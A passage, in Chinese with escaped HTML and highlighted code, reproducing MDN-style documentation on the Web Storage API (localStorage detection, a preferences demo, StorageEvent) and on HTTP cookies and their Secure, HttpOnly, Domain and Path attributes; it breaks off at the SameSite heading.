&lt;p&gt;支持 localStorage 的浏览器将在窗口对象上具有一个名为 localStorage 的属性。但是，仅断言该属性存在可能会引发异常。如果 localStorage 确实存在，则仍然不能保证 localStorage 实际可用，因为各种浏览器都提供了禁用 localStorage 的设置。因此，浏览器可能支持localStorage，但不适用于页面上的脚本。&lt;/p&gt;
&lt;p&gt;例如，私有浏览模式下的 Safari 浏览器为我们提供了一个空的l ocalStorage 对象，其配额为零，实际上使它无法使用。相反，我们可能会收到合法的 QuotaExceededError，这意味着我们已经用完了所有可用的存储空间，但实际上存储空间可用。我们的功能检测应考虑这些情况。&lt;/p&gt;
&lt;p&gt;这是一个检测 localStorage 是否同时受支持和可用的函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; storageAvailable(type) {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; storage;
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
        storage = &lt;span style=&#34;color:#658b00&#34;&gt;window&lt;/span&gt;[type];
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; x = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;__storage_test__&amp;#39;&lt;/span&gt;;
        storage.setItem(x, x);
        storage.removeItem(x);
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;true&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt;(e) {
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; e &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;instanceof&lt;/span&gt; DOMException &amp;amp;&amp;amp; (
            &lt;span style=&#34;color:#228b22&#34;&gt;// everything except Firefox
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.code === &lt;span style=&#34;color:#b452cd&#34;&gt;22&lt;/span&gt; ||
            &lt;span style=&#34;color:#228b22&#34;&gt;// Firefox
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.code === &lt;span style=&#34;color:#b452cd&#34;&gt;1014&lt;/span&gt; ||
            &lt;span style=&#34;color:#228b22&#34;&gt;// test name field too, because code might not be present
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#228b22&#34;&gt;// everything except Firefox
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.name === &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;QuotaExceededError&amp;#39;&lt;/span&gt; ||
            &lt;span style=&#34;color:#228b22&#34;&gt;// Firefox
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            e.name === &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;NS_ERROR_DOM_QUOTA_REACHED&amp;#39;&lt;/span&gt;) &amp;amp;&amp;amp;
            &lt;span style=&#34;color:#228b22&#34;&gt;// acknowledge QuotaExceededError only if there&amp;#39;s something already stored
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            (storage &amp;amp;&amp;amp; storage.length !== &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是您将如何使用它：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (storageAvailable(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;localStorage&amp;#39;&lt;/span&gt;)) {
  &lt;span style=&#34;color:#228b22&#34;&gt;// Yippee! We can use localStorage awesomeness
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
  &lt;span style=&#34;color:#228b22&#34;&gt;// Too bad, no localStorage for us
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;您可以通过调用 &lt;code&gt;storageAvailable(&#39;sessionStorage&#39;)&lt;/code&gt; 来测试 sessionStorage。&lt;/p&gt;
&lt;p&gt;请参阅此处，&lt;a href=&#34;https://gist.github.com/paulirish/5558557&#34;&gt;brief history of feature-detecting localStorage&lt;/a&gt;.。&lt;/p&gt;
&lt;h2 id=&#34;一个简单的示例&#34;&gt;一个简单的示例&lt;/h2&gt;
&lt;p&gt;为了展示 Web Storage 的用法，我们创建了一个简单的示例，假设称为 &lt;strong&gt;Web Storage Demo&lt;/strong&gt;。&lt;a href=&#34;https://mdn.github.io/dom-examples/web-storage/&#34;&gt;示例页面&lt;/a&gt;提供了控制表单，用于自定义颜色、字体和装饰图片：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://mdn.mozillademos.org/files/9685/landing.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;当你选择不同的选项后，页面会立即更新；除此之外，你的选择会被存到 &lt;code&gt;localStorage&lt;/code&gt; 里，这样，当你关闭页面之后重新加载时，你的选择会被记住。&lt;/p&gt;
&lt;p&gt;我们还提供了一个&lt;a href=&#34;https://mdn.github.io/dom-examples/web-storage/event.html&#34;&gt;存储事件结果页面&lt;/a&gt; — 如果你在另一个标签页加载该页面，然后改变之前示例页面的选项，则随着 &lt;code&gt;StorageEvent&lt;/code&gt; 事件的触发，更新的存储信息会显示出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://mdn.mozillademos.org/files/9687/event-output.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;备注：&lt;/strong&gt; 除了使用上面的链接查看示例页面外，还可以&lt;a href=&#34;https://github.com/mdn/dom-examples/tree/master/web-storage&#34;&gt;获取源码&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;测试本地存储是否已被填充&#34;&gt;测试本地存储是否已被填充&lt;/h3&gt;
&lt;p&gt;在 &lt;a href=&#34;https://github.com/mdn/dom-examples/blob/master/web-storage/main.js&#34;&gt;main.js&lt;/a&gt; 开头，我们先测试本地存储是否已被填充（即，页面之前被访问过）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(!localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;)) {
  populateStorage();
} &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
  setStyles();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem&#34;&gt;&lt;code&gt;Storage.getItem()&lt;/code&gt;&lt;/a&gt; 方法用来从存储中获取一个数据项。该例中，我们测试 &lt;code&gt;bgcolor&lt;/code&gt; 数据项是否存在。如果不存在，执行 &lt;code&gt;populateStorage()&lt;/code&gt; 来将存在的自定义值添加到存储中。如果有值存在，则执行 &lt;code&gt;setStyles()&lt;/code&gt; 来使用存储的值更新页面的样式。&lt;/p&gt;
&lt;p&gt;**备注：**你还可以使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/length&#34;&gt;&lt;code&gt;Storage.length&lt;/code&gt;&lt;/a&gt; 来测试存储对象是否为空。&lt;/p&gt;
&lt;h3 id=&#34;从存储中获取值&#34;&gt;从存储中获取值&lt;/h3&gt;
&lt;p&gt;正如上面提到的，使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem&#34;&gt;&lt;code&gt;Storage.getItem()&lt;/code&gt;&lt;/a&gt; 可以从存储中获取一个数据项。该方法接受数据项的键作为参数，并返回数据值。例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; setStyles() {
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; currentColor = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; currentFont = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;var&lt;/span&gt; currentImage = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;);

  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;).value = currentColor;
  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;).value = currentFont;
  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;).value = currentImage;

  htmlElem.style.backgroundColor = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#&amp;#39;&lt;/span&gt; + currentColor;
  pElem.style.fontFamily = currentFont;
  imgElem.setAttribute(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;src&amp;#39;&lt;/span&gt;, currentImage);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;首先，前三行代码从本地中获取值。接着，将值显示到表单元素中，这样在重新加载页面时与自定义设置保持同步。最后，更新页面的样式和图片，这样重新加载页面后，你的自定义设置重新起作用了。&lt;/p&gt;
&lt;h3 id=&#34;在存储中设置值&#34;&gt;在存储中设置值&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 方法可被用来创建新数据项和更新已存在的值。该方法接受两个参数——要创建/修改的数据项的键，和对应的值。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; populateStorage() {
  localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;).value);
  localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;font&amp;#39;&lt;/span&gt;).value);
  localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;image&amp;#39;&lt;/span&gt;).value);

  setStyles();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;populateStorage()&lt;/code&gt; 方法在本地存储中设置三项数据 — 背景颜色、字体和图片路径。然后执行 &lt;code&gt;setStyles()&lt;/code&gt; 方法来更新页面的样式。&lt;/p&gt;
&lt;p&gt;同时，我们为每个表单元素绑定了一个 &lt;code&gt;onchange&lt;/code&gt; 监听器，这样，一个表单值改变时，存储的数据和页面样式会更新。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;bgcolorForm.onchange = populateStorage;
fontForm.onchange = populateStorage;
imageForm.onchange = populateStorage;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;通过-storageevent-响应存储的变化&#34;&gt;通过 StorageEvent 响应存储的变化&lt;/h3&gt;
&lt;p&gt;无论何时，&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象发生变化时（即创建/更新/删除数据项时，重复设置相同的键值不会触发该事件，&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/clear&#34;&gt;&lt;code&gt;Storage.clear()&lt;/code&gt;&lt;/a&gt; 方法至多触发一次该事件），&lt;code&gt;StorageEvent&lt;/code&gt; 事件会触发。在同一个页面内发生的改变不会起作用——在相同域名下的其他页面（如一个新标签或 iframe）发生的改变才会起作用。在其他域名下的页面不能访问相同的 Storage 对象。&lt;/p&gt;
&lt;p&gt;在事件结果页面中的 JavaScript 如下所示（可见 &lt;a href=&#34;https://github.com/mdn/dom-examples/blob/master/web-storage/event.js&#34;&gt;events.js&lt;/a&gt;）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#658b00&#34;&gt;window&lt;/span&gt;.addEventListener(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;storage&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt;(e) {  
  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-key&amp;#39;&lt;/span&gt;).textContent = e.key;
  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-old&amp;#39;&lt;/span&gt;).textContent = e.oldValue;
  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-new&amp;#39;&lt;/span&gt;).textContent = e.newValue;
  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-url&amp;#39;&lt;/span&gt;).textContent = e.url;
  &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.querySelector(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;.my-storage&amp;#39;&lt;/span&gt;).textContent = e.storageArea;
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里，我们为 window 对象添加了一个事件监听器，在当前域名相关的 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象发生改变时该事件监听器会触发。正如你在上面看到的，此事件相关的事件对象有多个属性包含了有用的信息——改变的数据项的键，改变前的旧值，改变后的新值，改变的存储对象所在的文档的 URL，以及存储对象本身。&lt;/p&gt;
&lt;h3 id=&#34;删除数据记录&#34;&gt;删除数据记录&lt;/h3&gt;
&lt;p&gt;Web Storage 提供了一对简单的方法用于移除数据。我们没用在我们的 demo 中使用这些方法，但是添加到你自己的项目中很简单：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/removeItem&#34;&gt;&lt;code&gt;Storage.removeItem()&lt;/code&gt;&lt;/a&gt; 接受一个参数——你想要移除的数据项的键，然后会将对应的数据项从域名对应的存储对象中移除。&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/clear&#34;&gt;&lt;code&gt;Storage.clear()&lt;/code&gt;&lt;/a&gt; 不接受参数，只是简单地清空域名对应的整个存储对象。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;http-cookies&#34;&gt;HTTP cookies&lt;/h1&gt;
&lt;p&gt;HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless&#34;&gt;无状态&lt;/a&gt;的HTTP协议记录稳定的状态信息成为了可能。&lt;/p&gt;
&lt;p&gt;Cookie 主要用于以下三个方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）&lt;/li&gt;
&lt;li&gt;个性化设置（如用户自定义设置、主题等）&lt;/li&gt;
&lt;li&gt;浏览器行为跟踪（如跟踪分析用户行为等）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API&#34;&gt;Web storage API&lt;/a&gt; （本地存储和会话存储）或 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API&#34;&gt;IndexedDB&lt;/a&gt; 。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;要查看Cookie存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用&lt;strong&gt;存储查看&lt;/strong&gt;（&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector&#34;&gt;Storage Inspector&lt;/a&gt; ）功能，并在存储树上选中&lt;strong&gt;Cookie&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://www.openheart.icu/image/Cookie-20200725121428491.png&#34; alt=&#34;image-20200725121428491&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;创建cookie&#34;&gt;创建Cookie&lt;/h2&gt;
&lt;p&gt;当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 &lt;code&gt;{{HTTPHeader(&amp;quot;Set-Cookie&amp;quot;)}}&lt;/code&gt;选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 &lt;code&gt;{{HTTPHeader(&amp;quot;Cookie&amp;quot;)}} &lt;/code&gt;请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。&lt;/p&gt;
&lt;h3 id=&#34;set-cookie响应头部和cookie请求头部&#34;&gt;&lt;code&gt;Set-Cookie响应头部&lt;/code&gt;和&lt;code&gt;Cookie请求头部&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;服务器使用 &lt;code&gt;{{HTTPHeader(&amp;quot;Set-Cookie&amp;quot;)}} &lt;/code&gt;响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Set-Cookie: &amp;lt;cookie名&amp;gt;=&amp;lt;cookie值&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;服务器通过该头部告知客户端保存 Cookie 信息。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[页面内容]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过{{HTTPHeader(&amp;ldquo;Cookie&amp;rdquo;)}}请求头部再发送给服务器。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;提示:&lt;/strong&gt; 如何在以下几种服务端程序中设置 &lt;code&gt;Set-Cookie&lt;/code&gt; 响应头信息 :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://secure.php.net/manual/en/function.setcookie.php&#34;&gt;PHP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value&#34;&gt;Node.JS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.python.org/3/library/http.cookies.html&#34;&gt;Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html&#34;&gt;Ruby on Rails&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;定义-cookie-的生命周期&#34;&gt;定义 Cookie 的生命周期&lt;/h3&gt;
&lt;p&gt;Cookie 的生命周期可以通过两种方式定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（&lt;code&gt;Expires&lt;/code&gt;）或者有效期（&lt;code&gt;Max-Age&lt;/code&gt;）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。&lt;/li&gt;
&lt;li&gt;持久性 Cookie 的生命周期取决于过期时间（&lt;code&gt;Expires&lt;/code&gt;）或有效期（&lt;code&gt;Max-Age&lt;/code&gt;）指定的一段时间。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;提示&lt;/strong&gt;：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。&lt;/p&gt;
&lt;p&gt;如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation&#34;&gt;会话固定攻击（session fixation attacks）&lt;/a&gt;，在该攻击中第三方可以重用用户的会话。&lt;/p&gt;
&lt;h3 id=&#34;限制访问-cookie&#34;&gt;限制访问 Cookie&lt;/h3&gt;
&lt;p&gt;有两种方法可以确保 &lt;code&gt;Cookie&lt;/code&gt; 被安全发送，并且不会被意外的参与者或脚本访问：&lt;code&gt;Secure&lt;/code&gt; 属性和&lt;code&gt;HttpOnly&lt;/code&gt; 属性。&lt;/p&gt;
&lt;p&gt;标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 &lt;code&gt;{{Glossary（“ MitM”，“ man-in-the -middle“）}} &lt;/code&gt;攻击者的攻击。但即便设置了 Secure标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。&lt;/p&gt;
&lt;p&gt;从 Chrome 52 和 Firefox 52 开始，不安全的站点（&lt;code&gt;http:&lt;/code&gt;）无法使用Cookie的 Secure 标记。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;JavaScript {{domxref（“ Document.cookie”）}} API &lt;/code&gt;无法访问带有 &lt;code&gt;HttpOnly&lt;/code&gt; 属性的cookie；此类 Cookie 仅作用于服务器。例如，例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 &lt;code&gt;HttpOnly&lt;/code&gt; 属性。此预防措施有助于缓解&lt;a href=&#34;https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS)&#34;&gt;跨站点脚本（XSS）&lt;/a&gt;攻击。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cookie-的作用域&#34;&gt;Cookie 的作用域&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Domain&lt;/code&gt; 和 &lt;code&gt;Path&lt;/code&gt; 标识定义了Cookie的&lt;em&gt;作用域&lt;/em&gt;：即允许 Cookie 应该发送给哪些URL。&lt;/p&gt;
&lt;h4 id=&#34;domain-属性&#34;&gt;Domain 属性&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;Domain&lt;/code&gt; 指定了哪些主机可以接受 Cookie。如果不指定，默认为 &lt;code&gt;{{Glossary(&amp;quot;origin&amp;quot;)}}&lt;/code&gt;，&lt;strong&gt;不包含子域名&lt;/strong&gt;。如果指定了Domain，则一般包含子域名。因此，指定 Domain比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。&lt;/p&gt;
&lt;p&gt;例如，如果设置 &lt;code&gt;Domain=mozilla.org&lt;/code&gt;，则 Cookie 也包含在子域名中（如&lt;code&gt;developer.mozilla.org&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;当前大多数浏览器遵循 &lt;a href=&#34;http://tools.ietf.org/html/rfc6265&#34;&gt;RFC 6265&lt;/a&gt;，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：&lt;code&gt;Domain=.mozilla.org&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;path-属性&#34;&gt;Path 属性&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;Path&lt;/code&gt; 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 &lt;code&gt;%x2F&lt;/code&gt; (&amp;quot;/&amp;quot;) 作为路径分隔符，子路径也会被匹配。&lt;/p&gt;
&lt;p&gt;例如，设置 &lt;code&gt;Path=/docs&lt;/code&gt;，则以下地址都会匹配：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/docs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/docs/Web/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/docs/Web/HTTP&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;samesite-attribute&#34;&gt;SameSite attribute&lt;/h4&gt;
